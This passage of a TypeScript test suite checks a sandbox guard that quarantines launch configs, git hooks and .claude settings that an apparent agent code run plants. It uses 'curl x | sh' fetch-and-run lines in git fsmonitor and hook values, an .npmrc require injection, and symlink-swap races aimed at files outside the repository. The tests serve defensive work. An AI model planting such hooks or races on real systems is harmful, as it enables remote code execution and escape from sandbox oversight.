      mkdirSync(at, { mode: 0o700 });
      chmodSync(at, 0o700);
      writeFileSync(join(at, "id_ed25519"), "KEY", { mode: 0o600 });
      return at;
    };
    /**
     * Swaps `rel` for a link to `target` right after the guard's first look at it: at its second
     * open (the first, for reading, is refused for the mode the run set), or at a `chmod` by path.
     */
    const swap = (rel: string, target: string) => {
      let done = false;
      let opens = 0;
      const go = () => {
        if (done) return;
        done = true;
        renameSync(join(repo, rel), join(repo, `${rel}.moved`));
        symlinkSync(target, join(repo, rel));
      };
      hooks.open = (path) => {
        if (path === join(repo, rel) && ++opens === 2) go();
      };
      hooks.chmod = (path) => {
        if (path === join(repo, rel)) go();
      };
    };

    it.runIf(process.platform === "darwin")(
      "R1: making a folder listable again, and never writes a sticky bit",
      async () => {
        const outside = owner();
        put("pkg/index.js");
        const { use, runner, reports } = setup();
        acts(runner, "plant", () => {
          put("pkg/.npmrc", "node-options=--require ./x.js");
          chmodSync(join(repo, "pkg"), 0o1177);
          swap("pkg", outside);
        });
        await use("code.open", { path: repo });
        await use("code.run", { root: repo, argv: ["plant"] });
        const report = reports[0] as LaunchConfigReport;
        expect(lstatSync(outside).mode & 0o7777).toBe(0o700);
        expect(report.unmoved).toEqual(["pkg"]);
        // The real folder, found under its new name, is listable again and what it hid is held.
        expect(report.quarantined).toEqual(["pkg.moved/.npmrc"]);
        expect(lstatSync(join(repo, "pkg.moved")).mode & 0o7777).toBe(0o577);
      },
    );

    it("R2: giving a search-only folder write permission to move it", async () => {
      const outside = owner();
      const { use, runner, reports } = setup();
      acts(runner, "plant", () => {
        put(".vscode/tasks.json", "{}");
        chmodSync(join(repo, ".vscode"), 0o1177);
        swap(".vscode", outside);
      });
      await use("code.open", { path: repo });
      const r = await use("code.run", { root: repo, argv: ["plant"] });
      const report = reports[0] as LaunchConfigReport;
      expect(lstatSync(outside).mode & 0o7777).toBe(0o700);
      expect(readdirSync(outside)).toEqual(["id_ed25519"]);
      expect(report.unmoved).toEqual([".vscode"]);
      expect((r.output.launchConfig as { notice: string }).notice).toMatch(/not held/);
    });

    // #1450 review r2, R4: a folder above swapped for a link, which `O_NOFOLLOW` does not see.
    const locked = (mode: number) => {
      const at = join(dir, "locked", "pkg");
      mkdirSync(at, { recursive: true });
      chmodSync(at, mode);
      return at;
    };
    /** Never touched, not even for a moment: its mode and its inode change time are as they were. */
    const untouched = (at: string, mode: number, ctime: bigint) => {
      const st = lstatSync(at, { bigint: true });
      expect(Number(st.mode & 0o7777n)).toBe(mode);
      expect(st.ctimeNs).toBe(ctime);
    };
    const swapAbove = () => {
      renameSync(join(repo, "a"), join(repo, "a.moved"));
      symlinkSync(join(dir, "locked"), join(repo, "a"));
    };

    it("R4: making a folder listable again, when a folder above it is swapped", async () => {
      const outside = locked(0o300);
      const ctime = lstatSync(outside, { bigint: true }).ctimeNs;
      const { use, runner, reports } = setup();
      acts(runner, "plant", () => {
        put("a/pkg/.npmrc", "node-options=--require ./x.js");
        chmodSync(join(repo, "a/pkg"), 0o100);
        let done = false;
        hooks.lstat = (path) => {
          if (done || path !== join(repo, "a/pkg") || !new Error().stack?.includes("at lift ")) {
            return;
          }
          done = true;
          swapAbove();
        };
      });
      await use("code.open", { path: repo });
      await use("code.run", { root: repo, argv: ["plant"] });
      const report = reports[0] as LaunchConfigReport;
      untouched(outside, 0o300, ctime);
      expect(report.unmoved).toContain("a/pkg");
      if (process.platform === "darwin") {
        expect(report.quarantined).toEqual(["a.moved/pkg/.npmrc"]);
      }
    });

    it("R4: moving out of a read-only folder, when a folder above it is swapped", async () => {
      const outside = locked(0o500);
      const ctime = lstatSync(outside, { bigint: true }).ctimeNs;
      const { use, runner, reports } = setup();
      acts(runner, "plant", () => {
        put("a/pkg/.npmrc", "node-options=--require ./x.js");
        chmodSync(join(repo, "a/pkg"), 0o555);
        // Once the move was refused for its mode, at the next look at its folder.
        let armed = false;
        let done = false;
        hooks.rename = (from) => {
          if (from === join(repo, "a/pkg/.npmrc")) armed = true;
        };
        hooks.lstat = (path) => {
          if (!armed || done || path !== join(repo, "a/pkg")) return;
          done = true;
          swapAbove();
        };
      });
      await use("code.open", { path: repo });
      await use("code.run", { root: repo, argv: ["plant"] });
      const report = reports[0] as LaunchConfigReport;
      untouched(outside, 0o500, ctime);
      expect(report.unmoved).toContain("a/pkg/.npmrc");
    });

    // #1457 review r1, W1: a folder above swapped for a link while the walk lists it.
    it("W1: never names what is in a folder outside the repository", async () => {
      const outside = join(dir, "Elsewhere-Home", "sub");
      mkdirSync(join(outside, "Secret-Project-X"), { recursive: true });
      mkdirSync(join(outside, "Secret-Repo", ".git", "hooks"), { recursive: true });
      writeFileSync(join(outside, "Secret-Repo", ".git", "config"), "[core]\n");
      writeFileSync(join(outside, ".npmrc"), "registry=x");
      chmodSync(join(outside, "Secret-Project-X"), 0o000);
      put("a/sub/readme.md");
      const { use, runner, reports } = setup();
      acts(runner, "swap", () => {
        let done = false;
        hooks.readdir = (path) => {
          if (done || path !== join(repo, "a/sub")) return;
          done = true;
          renameSync(join(repo, "a"), join(repo, "a.moved"));
          symlinkSync(join(dir, "Elsewhere-Home"), join(repo, "a"));
        };
      });
      await use("code.open", { path: repo });
      const r = await use("code.run", { root: repo, argv: ["swap"] });
      const report = reports[0] as LaunchConfigReport;
      const said = JSON.stringify([report, r.output.launchConfig]);
      expect(said).not.toMatch(/Secret|registry|Elsewhere/);
      expect(report.unmoved.some((p) => p.includes(".npmrc"))).toBe(false);
      // Said by the folder the swap was in.
      expect(report.unmoved).toContain("a/sub");
      expect((r.output.launchConfig as { counts: { unmoved: number } }).counts.unmoved).toBe(
        report.unmoved.length,
      );
      // Nothing outside was moved or changed.
      expect(readdirSync(outside).sort()).toEqual([".npmrc", "Secret-Project-X", "Secret-Repo"]);
      expect(lstatSync(join(outside, "Secret-Project-X")).mode & 0o7777).toBe(0o000);
    });

    it("R3: a file inside an entry moved across volumes", async () => {
      const outside = owner();
      const { use, runner, reports } = setup();
      hooks.rename = (from) => {
        if (from === join(repo, ".vscode")) {
          throw Object.assign(new Error("cross-device link"), { code: "EXDEV" });
        }
      };
      acts(runner, "plant", () => {
        put(".vscode/tasks.json", "{}");
        chmodSync(join(repo, ".vscode/tasks.json"), 0o277);
        swap(".vscode/tasks.json", join(outside, "id_ed25519"));
      });
      await use("code.open", { path: repo });
      await use("code.run", { root: repo, argv: ["plant"] });
      const report = reports[0] as LaunchConfigReport;
      expect(lstatSync(join(outside, "id_ed25519")).mode & 0o7777).toBe(0o600);
      expect(report.unmoved).toEqual([".vscode"]);
    });

    it("moves an entry with read-only folders and unreadable files across volumes", async () => {
      const { use, runner, reports } = setup();
      hooks.rename = (from) => {
        if (from === join(repo, ".vscode")) {
          throw Object.assign(new Error("cross-device link"), { code: "EXDEV" });
        }
      };
      acts(runner, "plant", () => {
        put(".vscode/sub/tasks.json", "{}");
        chmodSync(join(repo, ".vscode/sub/tasks.json"), 0o200);
        chmodSync(join(repo, ".vscode/sub"), 0o555);
      });
      await use("code.open", { path: repo });
      await use("code.run", { root: repo, argv: ["plant"] });
      const report = reports[0] as LaunchConfigReport;
      expect(report.quarantined).toEqual([".vscode"]);
      expect(existsSync(join(repo, ".vscode"))).toBe(false);
      const held = join(quarantine, report.quarantineId as string, "entries");
      expect(readFileSync(join(held, ".vscode/sub/tasks.json"), "utf8")).toBe("{}");
    });
  });

  // #1435 review r3, item 1: a symlinked `.claude`.
  it("treats a .claude linked outside the repository as known, and watches its settings", async () => {
    const elsewhere = join(dir, "dotfiles", "claude");
    mkdirSync(elsewhere, { recursive: true });
    writeFileSync(join(elsewhere, "settings.json"), "{}");
    symlinkSync(elsewhere, join(repo, ".claude"));
    const { use, runner, reports } = setup();
    acts(runner, "edit", () =>
      writeFileSync(join(elsewhere, "settings.json"), '{"hooks":{"SessionStart":[]}}'),
    );
    await use("code.open", { path: repo });
    await use("code.run", { root: repo, argv: ["edit"] });
    // Not quarantined: the owner's own link stays where it is.
    expect(readlinkSync(join(repo, ".claude"))).toBe(elsewhere);
    expect(reports[0]?.quarantined).toEqual([]);
    expect(reports[0]?.changed).toEqual([".claude/settings.json"]);
  });

  it("mounts the folder a .claude link inside the repository points at read-only", async () => {
    put("config/claude/settings.json", "{}");
    symlinkSync("config/claude", join(repo, ".claude"));
    const { use, runner, reports } = setup();
    acts(runner, "edit", () =>
      put("config/claude/settings.json", '{"hooks":{"SessionStart":[{"command":"x"}]}}'),
    );
    await use("code.open", { path: repo });
    await use("code.run", { root: repo, argv: ["edit"] });
    const id = (await use("code.open", { path: repo })).output.workspace as string;
    const sbx = await runner.ensureSandbox(
      { kind: "project", id },
      {
        mounts: [
          { source: repo, target: "/workspace/repo", readOnly: false },
          {
            source: join(repo, "config/claude"),
            target: "/workspace/repo/config/claude",
            readOnly: true,
          },
        ],
      },
    );
    expect(sbx.id).toBe(runner.execs[0]?.sandboxId);
    expect(existsSync(join(repo, ".claude"))).toBe(true);
    expect(reports[0]?.quarantined).toEqual([]);
    expect(reports[0]?.changed).toEqual([".claude/settings.json"]);
  });

  // #1435 review r2, B1: a repository the run made, which VS Code finds and runs git in.
  it("holds what git runs from in a .git the run made, and keeps the clone's history", async () => {
    const fsmonitor = "[core]\n\tfsmonitor = sh -c 'curl x | sh'\n";
    const { use, runner, reports } = setup();
    acts(runner, "clone", () => {
      put("tools/x/.git/config", fsmonitor);
      put("tools/x/.git/hooks/post-checkout", "#!/bin/sh\n");
      put("tools/x/.git/objects/ab/cdef", "x");
      put("tools/x/.git/HEAD", "ref: refs/heads/main\n");
      // Build output is never walked, but its repositories are looked for.
      put("build/.git/config", fsmonitor);
      put("build/.git/HEAD", "ref: refs/heads/main\n");
      put("dist/web/.git/config", fsmonitor);
      // A `.git` file pointing elsewhere.
      put("lib/y/.git", "gitdir: /tmp/evil\n");
    });
    await use("code.open", { path: repo });
    await use("code.run", { root: repo, argv: ["clone"] });
    expect([...(reports[0]?.quarantined ?? [])].sort()).toEqual([
      "build/.git/config",
      "dist/web/.git/config",
      "lib/y/.git",
      "tools/x/.git/config",
      "tools/x/.git/hooks",
    ]);
    expect(existsSync(join(repo, "tools/x/.git/config"))).toBe(false);
    expect(existsSync(join(repo, "tools/x/.git/objects/ab/cdef"))).toBe(true);
    expect(existsSync(join(repo, "build/.git/HEAD"))).toBe(true);
  });

  it("says .claude is read-only during code.run when a write there failed", async () => {
    put(".claude/settings.json", "{}");
    const { use, runner } = setup();
    runner.script(["sh"], {
      exitCode: 1,
      stderr: "sh: can't create /workspace/repo/.claude/skills/x.md: Read-only file system\n",
    });
    await use("code.open", { path: repo });
    const r = await use("code.run", {
      root: repo,
      argv: ["sh", "-c", "echo > .claude/skills/x.md"],
    });
    expect(r.output.readOnlyHint).toMatch(/`\.claude`.*read-only during code\.run.*code\.edit/);
  });

  // #1435 review r1, items 4 and 5.
  it("refuses a repository with more read-only folders than one sandbox takes", async () => {
    for (let i = 0; i < 24; i++) put(`p${i}/.vscode/settings.json`);
    put(".claude/settings.json");
    const { use, runner } = setup();
    await use("code.open", { path: repo });
    await expect(use("code.run", { root: repo, argv: ["true"] })).rejects.toMatchObject({
      code: "forbidden",
      details: { reason: "launch_config_too_many", count: 25 },
    });
    expect(runner.execs).toHaveLength(0);
  });

  it("mounts a vendored clone's .git read-only and watches its hooks", async () => {
    put("vendor/lib/.git/config", "[core]\n");
    put("vendor/lib/.git/hooks/pre-commit.sample", "#!/bin/sh\n");
    put("vendor/lib/.git/objects/ab/cd", "x");
    const { use, runner, reports } = setup();
    acts(runner, "tamper", () => put("vendor/lib/.git/hooks/post-checkout", "curl x | sh"));
    await use("code.open", { path: repo });
    await use("code.run", { root: repo, argv: ["tamper"] });
    const id = (await use("code.open", { path: repo })).output.workspace as string;
    const sbx = await runner.ensureSandbox(
      { kind: "project", id },
      {
        mounts: [
          { source: repo, target: "/workspace/repo", readOnly: false },
          {
            source: join(repo, "vendor/lib/.git"),
            target: "/workspace/repo/vendor/lib/.git",
            readOnly: true,
          },
        ],
      },
    );
    expect(sbx.id).toBe(runner.execs[0]?.sandboxId);
    expect(reports[0]?.changed).toEqual(["vendor/lib/.git/hooks/post-checkout"]);
    expect(reports[0]?.quarantined).toEqual([]);
  });

  it("reports a change under .git's config, hooks and info, and a replaced link", async () => {
    put(".git/config", "[core]\n");
    put(".git/hooks/pre-commit.sample", "#!/bin/sh\n");
    mkdirSync(join(dir, "dotfiles", "obsidian"), { recursive: true });
    symlinkSync(join(dir, "dotfiles", "obsidian"), join(repo, ".obsidian"));
    const { use, runner, reports } = setup();
    acts(runner, "tamper", () => {
      put(".git/hooks/pre-commit", "#!/bin/sh\ncurl x | sh\n");
      rmSync(join(repo, ".obsidian"));
      put(".obsidian/plugins/x/main.js");
    });
    await use("code.open", { path: repo });
    await use("code.run", { root: repo, argv: ["tamper"] });
    expect(reports[0]?.changed).toEqual(
      expect.arrayContaining([".git/hooks/pre-commit", ".obsidian"]),
    );
    // A replaced entry is not moved: it may be the owner's.
    expect(existsSync(join(dir, "dotfiles", "obsidian"))).toBe(true);
    expect(existsSync(join(repo, ".obsidian/plugins/x/main.js"))).toBe(true);
  });

  it("skips build and cache folders, and falls back to the top levels over the limit", async () => {
    put("node_modules/pkg/.npmrc");
    put("target/debug/.vscode/x.json");
    put(".claude/worktrees/agent-1/.vscode/settings.json");
    const { use, runner, reports } = setup();
    acts(runner, "build", () => {
      put("node_modules/other/.npmrc");
      put(".claude/worktrees/agent-2/.husky/pre-commit");
    });
    await use("code.open", { path: repo });
    const r = await use("code.run", { root: repo, argv: ["build"] });
    expect(reports).toEqual([]);
    expect(r.output.launchConfig).toBeUndefined();

    for (let i = 0; i < 6; i++) put(`deep/d${i}/e/f.txt`);
    const small = setup(new FakeSandboxRunner(), 4);
    acts(small.runner, "plant", () => {
      put(".husky/pre-commit");
      put("deep/d1/e/.npmrc");
    });
    await small.use("code.open", { path: repo });
    await small.use("code.run", { root: repo, argv: ["plant"] });
    const report = small.reports[0] as LaunchConfigReport;
    expect(report.partial).toBe(true);
    // The top levels were checked; deeper ones were not walked.
    expect(report.quarantined).toEqual([".husky"]);
  });

  it("makes the sandbox again when the mounts changed, and says so", async () => {
    const { use, runner, recreated } = setup();
    await use("code.open", { path: repo });
    await use("code.run", { root: repo, argv: ["true"] });
    // The owner opens the repository in an IDE, which adds its folder.
    put(".idea/workspace.xml");
    await use("code.run", { root: repo, argv: ["true"] });
    expect(runner.execs[1]?.sandboxId).not.toBe(runner.execs[0]?.sandboxId);
    expect(recreated).toEqual([repo]);
  });

  it("never runs on the sandbox PC with nested read-only folders", async () => {
    put(".git/config", "[core]\n");
    const { use, runner } = setup(new FakeSandboxRunner({ backend: "vm" }));
    await use("code.open", { path: repo });
    await expect(use("code.run", { root: repo, argv: ["true"] })).rejects.toMatchObject({
      code: "unavailable",
      details: { reason: "nested_mounts_unsupported" },
    });
    expect(runner.execs).toHaveLength(0);
  });
});
